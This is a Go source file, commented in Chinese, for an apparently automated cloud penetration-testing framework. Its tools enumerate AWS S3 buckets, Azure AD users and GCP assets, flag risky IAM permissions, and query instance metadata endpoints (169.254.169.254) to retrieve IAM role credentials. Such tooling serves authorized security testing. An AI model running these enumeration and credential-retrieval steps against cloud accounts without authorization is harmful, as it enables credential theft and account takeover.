package scenarios

// Package cloud_enhanced —— 云渗透增强包(抄 Shannon + NOVA):
// AWS/Azure/GCP 配置审计 + 权限提升 + 元数据服务利用。
//
// 设计要点:
//   - 多云支持: AWS(boto3/awscli) > Azure(az-cli) > GCP(gcloud)。
//   - 权限枚举: IAM 策略分析 + 权限提升路径 (pacu/ScoutSuite)。
//   - 元数据 SSRF: 云实例元数据服务利用 (169.254.169.254)。
//   - 资源发现: S3 桶/存储账户/GCS 公开访问检测。
//   - 凭证提取: 实例 IAM Role / Managed Identity 凭证窃取。

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/Coff0xc/vero/internal/tools"
)

// awsS3Enum —— AWS S3 桶枚举 + 公开访问检测。
// 使用 aws s3 ls 枚举桶, 然后检测每个桶的 ACL 和策略。
func awsS3Enum(args map[string]any) tools.ToolResult {
	profile := tools.ArgStr(args, "profile", "default")

	// 先列举所有桶
	listCmd := []string{"aws", "s3", "ls", "--profile", profile}
	listRes := tools.Sh(listCmd, 30*time.Second)
	if !listRes.Success {
		return listRes
	}

	// 对每个桶检测公开访问
	var findings []string
	for _, line := range strings.Split(listRes.Stdout, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// 格式: 2023-01-01 12:00:00 bucket-name
		parts := strings.Fields(line)
		if len(parts) < 3 {
			continue
		}
		bucket := parts[2]

		// 检测公开访问 (aws s3api get-bucket-acl)
		aclCmd := []string{"aws", "s3api", "get-bucket-acl", "--bucket", bucket, "--profile", profile}
		aclRes := tools.Sh(aclCmd, 15*time.Second)
		if aclRes.Success && strings.Contains(aclRes.Stdout, "AllUsers") {
			findings = append(findings, fmt.Sprintf("✗ 公开桶: %s (ACL 含 AllUsers)", bucket))
		} else {
			findings = append(findings, fmt.Sprintf("✓ 私有桶: %s", bucket))
		}
	}

	return tools.ToolResult{
		Success: true,
		Stdout:  strings.Join(findings, "\n"),
	}
}

// awsIAMPrivesc —— AWS IAM 权限提升路径分析。
// 枚举当前凭证的策略, 检测常见提权路径 (iam:AttachUserPolicy/PassRole 等)。
func awsIAMPrivesc(args map[string]any) tools.ToolResult {
	profile := tools.ArgStr(args, "profile", "default")

	// 1. 获取当前用户/角色
	whoamiCmd := []string{"aws", "sts", "get-caller-identity", "--profile", profile}
	whoamiRes := tools.Sh(whoamiCmd, 10*time.Second)
	if !whoamiRes.Success {
		return whoamiRes
	}

	var identity struct {
		UserId  string `json:"UserId"`
		Account string `json:"Account"`
		Arn     string `json:"Arn"`
	}
	if err := json.Unmarshal([]byte(whoamiRes.Stdout), &identity); err != nil {
		return tools.ToolResult{Success: false, Stderr: "解析 caller-identity 失败", RC: -1}
	}

	// 2. 枚举策略 (简化版: 只检测用户附加策略)
	userName := extractUserName(identity.Arn)
	if userName == "" {
		return tools.ToolResult{Success: false, Stderr: "无法提取用户名", RC: -1}
	}

	policiesCmd := []string{"aws", "iam", "list-attached-user-policies", "--user-name", userName, "--profile", profile}
	policiesRes := tools.Sh(policiesCmd, 15*time.Second)
	if !policiesRes.Success {
		return policiesRes
	}

	// 3. 检测危险权限
	dangerousPerms := []string{
		"iam:AttachUserPolicy",     // 可附加 AdministratorAccess
		"iam:CreateAccessKey",      // 可为其他用户创建密钥
		"iam:PassRole",             // 可将高权限角色传给服务
		"lambda:CreateFunction",    // 配合 PassRole 提权
		"ec2:RunInstances",         // 配合 PassRole 提权
		"sts:AssumeRole",           // 可假设其他角色
	}

	var findings []string
	findings = append(findings, fmt.Sprintf("当前身份: %s", identity.Arn))
	for _, perm := range dangerousPerms {
		if strings.Contains(policiesRes.Stdout, perm) || strings.Contains(policiesRes.Stdout, "*:*") {
			findings = append(findings, fmt.Sprintf("⚠ 危险权限: %s", perm))
		}
	}

	return tools.ToolResult{
		Success: true,
		Stdout:  strings.Join(findings, "\n"),
	}
}

// azureTenantEnum —— Azure AD 租户枚举 (用户/组/服务主体)。
func azureTenantEnum(args map[string]any) tools.ToolResult {
	// az ad user list --query "[].{Name:displayName,UPN:userPrincipalName}" -o json
	usersCmd := []string{"az", "ad", "user", "list", "--query", "[].{Name:displayName,UPN:userPrincipalName}", "-o", "json"}
	usersRes := tools.Sh(usersCmd, 60*time.Second)
	if !usersRes.Success {
		return usersRes
	}

	var users []struct {
		Name string `json:"Name"`
		UPN  string `json:"UPN"`
	}
	if err := json.Unmarshal([]byte(usersRes.Stdout), &users); err != nil {
		return tools.ToolResult{Success: false, Stderr: "解析用户列表失败", RC: -1}
	}

	findings := []string{fmt.Sprintf("Azure AD 用户总数: %d", len(users))}
	for i, u := range users {
		if i >= 10 { // 只展示前 10 个
			findings = append(findings, fmt.Sprintf("... (共 %d 个用户)", len(users)))
			break
		}
		findings = append(findings, fmt.Sprintf("  - %s (%s)", u.Name, u.UPN))
	}

	return tools.ToolResult{
		Success: true,
		Stdout:  strings.Join(findings, "\n"),
	}
}

// gcpProjectEnum —— GCP 项目资产发现 (实例/存储桶/服务账号)。
func gcpProjectEnum(args map[string]any) tools.ToolResult {
	project := tools.ArgStr(args, "project", "")
	if project == "" {
		// 尝试获取当前项目
		projCmd := []string{"gcloud", "config", "get-value", "project"}
		projRes := tools.Sh(projCmd, 10*time.Second)
		if projRes.Success {
			project = strings.TrimSpace(projRes.Stdout)
		}
	}

	if project == "" {
		return tools.ToolResult{Success: false, Stderr: "未指定项目且无默认项目", RC: -1}
	}

	var findings []string
	findings = append(findings, fmt.Sprintf("枚举 GCP 项目: %s", project))

	// 1. 枚举 Compute Engine 实例
	instancesCmd := []string{"gcloud", "compute", "instances", "list", "--project", project, "--format", "json"}
	instancesRes := tools.Sh(instancesCmd, 30*time.Second)
	if instancesRes.Success {
		var instances []struct {
			Name string `json:"name"`
			Zone string `json:"zone"`
		}
		if json.Unmarshal([]byte(instancesRes.Stdout), &instances) == nil {
			findings = append(findings, fmt.Sprintf("  实例数: %d", len(instances)))
		}
	}

	// 2. 枚举 GCS 存储桶
	bucketsCmd := []string{"gsutil", "ls", "-p", project}
	bucketsRes := tools.Sh(bucketsCmd, 30*time.Second)
	if bucketsRes.Success {
		bucketCount := len(strings.Split(strings.TrimSpace(bucketsRes.Stdout), "\n"))
		findings = append(findings, fmt.Sprintf("  存储桶数: %d", bucketCount))
	}

	// 3. 枚举服务账号
	saCmd := []string{"gcloud", "iam", "service-accounts", "list", "--project", project, "--format", "json"}
	saRes := tools.Sh(saCmd, 30*time.Second)
	if saRes.Success {
		var sas []struct {
			Email string `json:"email"`
		}
		if json.Unmarshal([]byte(saRes.Stdout), &sas) == nil {
			findings = append(findings, fmt.Sprintf("  服务账号数: %d", len(sas)))
		}
	}

	return tools.ToolResult{
		Success: true,
		Stdout:  strings.Join(findings, "\n"),
	}
}

// cloudMetadataExploit —— 云元数据服务利用 (SSRF → 凭证窃取)。
// 尝试访问 169.254.169.254 获取实例元数据 (IAM Role / Managed Identity)。
func cloudMetadataExploit(args map[string]any) tools.ToolResult {
	target := tools.ArgStr(args, "target", "http://169.254.169.254")

	var findings []string
	findings = append(findings, "云元数据服务利用:")

	// 1. AWS IMDSv1 (无需 token)
	awsCmd := []string{"curl", "-s", "-m", "5", target + "/latest/meta-data/iam/security-credentials/"}
	awsRes := tools.Sh(awsCmd, 10*time.Second)
	if awsRes.Success && awsRes.Stdout != "" {
		findings = append(findings, "✓ AWS IMDS 可访问 (IMDSv1)")
		findings = append(findings, "  IAM Role: "+strings.TrimSpace(awsRes.Stdout))

		// 尝试获取凭证
		role := strings.TrimSpace(awsRes.Stdout)
		if role != "" {
			credCmd := []string{"curl", "-s", "-m", "5", target + "/latest/meta-data/iam/security-credentials/" + role}
			credRes := tools.Sh(credCmd, 10*time.Second)
			if credRes.Success && strings.Contains(credRes.Stdout, "AccessKeyId") {
				findings = append(findings, "  ⚠ 凭证已泄露 (包含 AccessKeyId)")
			}
		}
	}

	// 2. Azure Managed Identity (需要 Metadata: true header)
	azureCmd := []string{"curl", "-s", "-m", "5", "-H", "Metadata:true",
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
	azureRes := tools.Sh(azureCmd, 10*time.Second)
	if azureRes.Success && strings.Contains(azureRes.Stdout, "compute") {
		findings = append(findings, "✓ Azure Metadata 可访问")
	}

	// 3. GCP Metadata (需要 Metadata-Flavor: Google header)
	gcpCmd := []string{"curl", "-s", "-m", "5", "-H", "Metadata-Flavor:Google",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"}
	gcpRes := tools.Sh(gcpCmd, 10*time.Second)
	if gcpRes.Success && gcpRes.Stdout != "" {
		findings = append(findings, "✓ GCP Metadata 可访问")
		findings = append(findings, "  服务账号: "+strings.TrimSpace(gcpRes.Stdout))
	}

	if len(findings) == 1 {
		findings = append(findings, "✗ 元数据服务不可达")
	}

	return tools.ToolResult{
		Success: true,
		Stdout:  strings.Join(findings, "\n"),
	}
}

// ParseCloudS3 —— 解析 S3 枚举结果, 提取公开桶。
func ParseCloudS3(out string, args map[string]any) []tools.Observation {
	var obs []tools.Observation
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "✗ 公开桶:") {
			bucket := strings.TrimPrefix(line, "✗ 公开桶: ")
			bucket = strings.Split(bucket, " ")[0]
			obs = append(obs, tools.Observation{
				Kind:     "finding",
				Key:      "s3:" + bucket,
				Label:    "[high] S3 公开桶: " + bucket,
				Excerpt:  line,
				Severity: "high",
			})
		}
	}
	return obs
}

// ParseCloudPrivesc —— 解析 IAM 权限提升路径。
func ParseCloudPrivesc(out string, args map[string]any) []tools.Observation{
	var obs []tools.Observation
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "⚠ 危险权限:") {
			perm := strings.TrimPrefix(line, "⚠ 危险权限: ")
			obs = append(obs, tools.Observation{
				Kind:     "finding",
				Key:      "iam-privesc:" + perm,
				Label:    "[critical] IAM 提权路径: " + perm,
				Excerpt:  line,
				Severity: "critical",
				Technique: "T1078",  // Valid Accounts
				Tactic:   "privilege-escalation",
			})
		}
	}
	return obs
}

// ParseCloudMetadata —— 解析元数据服务利用结果。
func ParseCloudMetadata(out string, args map[string]any) []tools.Observation {
	var obs []tools.Observation
	if strings.Contains(out, "凭证已泄露") {
		obs = append(obs, tools.Observation{
			Kind:     "finding",
			Key:      "cloud-metadata:cred-leak",
			Label:    "[critical] 云元数据凭证泄露",
			Excerpt:  "⚠ 凭证已泄露 (包含 AccessKeyId)",
			Severity: "critical",
			Technique: "T1552.005", // Cloud Instance Metadata API
			Tactic:   "credential-access",
		})
	}
	if strings.Contains(out, "IMDS 可访问") || strings.Contains(out, "Metadata 可访问") {
		obs = append(obs, tools.Observation{
			Kind:    "finding",
			Key:     "cloud-metadata:accessible",
			Label:   "[medium] 云元数据服务可访问",
			Excerpt: "元数据服务可从目标访问",
			Severity: "medium",
		})
	}
	return obs
}

// extractUserName —— 从 ARN 提取用户名。
// arn:aws:iam::123456789012:user/alice -> alice
func extractUserName(arn string) string {
	parts := strings.Split(arn, "/")
	if len(parts) > 0 {
		return parts[len(parts)-1]
	}
	return ""
}

// CloudPackEnhanced —— 云渗透增强包 (抄 Shannon + NOVA)。
func CloudPackEnhanced() Pack {
	return Pack{
		Name: "CloudEnhanced",
		Tools: []*tools.Tool{
			{
				Name:  "aws_s3_enum",
				Level: tools.LevelScan,
				Desc:  "AWS S3 桶枚举 + 公开访问检测, 发现配置错误的存储桶",
				Run:   awsS3Enum,
				Parse: ParseCloudS3,
				Args: []tools.ArgSpec{
					{Name: "profile", Desc: "AWS CLI profile 名称 (默认 default)"},
				},
			},
			{
				Name:  "aws_iam_privesc",
				Level: tools.LevelCred,
				Desc:  "AWS IAM 权限提升路径分析, 检测危险权限 (AttachUserPolicy/PassRole 等)",
				Run:   awsIAMPrivesc,
				Parse: ParseCloudPrivesc,
				Args: []tools.ArgSpec{
					{Name: "profile", Desc: "AWS CLI profile 名称 (默认 default)"},
				},
			},
			{
				Name:  "azure_tenant_enum",
				Level: tools.LevelScan,
				Desc:  "Azure AD 租户枚举 (用户/组/服务主体), 绘制 AD 拓扑",
				Run:   azureTenantEnum,
				Parse: nil,
				Args:  []tools.ArgSpec{},
			},
			{
				Name:  "gcp_project_enum",
				Level: tools.LevelScan,
				Desc:  "GCP 项目资产发现 (实例/存储桶/服务账号), 全景扫描云资源",
				Run:   gcpProjectEnum,
				Parse: nil,
				Args: []tools.ArgSpec{
					{Name: "project", Desc: "GCP 项目 ID (留空使用当前项目)"},
				},
			},
			{
				Name:  "cloud_metadata_exploit",
				Level: tools.LevelExploit,
				Desc:  "云元数据服务利用 (SSRF → 169.254.169.254), 窃取 IAM/Managed Identity 凭证",
				Run:   cloudMetadataExploit,
				Parse: ParseCloudMetadata,
				Args: []tools.ArgSpec{
					{Name: "target", Desc: "元数据服务 URL (默认 http://169.254.169.254)"},
				},
			},
		},
		// 指纹: 发现 AWS/Azure/GCP 环境特征时激活
		Fingerprint: func(services map[string]bool) bool {
			return services["aws"] || services["azure"] || services["gcp"] || services["cloud"]
		},
	}
}
